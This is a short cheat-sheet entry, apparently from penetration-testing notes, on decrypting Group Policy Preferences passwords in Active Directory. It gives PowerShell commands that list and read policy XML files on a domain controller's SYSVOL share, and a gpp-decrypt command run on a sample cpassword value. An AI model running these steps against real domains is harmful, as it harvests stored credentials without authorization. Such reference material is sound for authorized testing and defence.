---
title: GPP Password Decryption
category: ad
subcategory: ad-attacks
os: linux, windows
command: gpp-decrypt 'cpassword'
tools: gpp-decrypt
---


### Locate Group Policy XML files

```powershell
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

### Decrypt the cpassword value

```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```
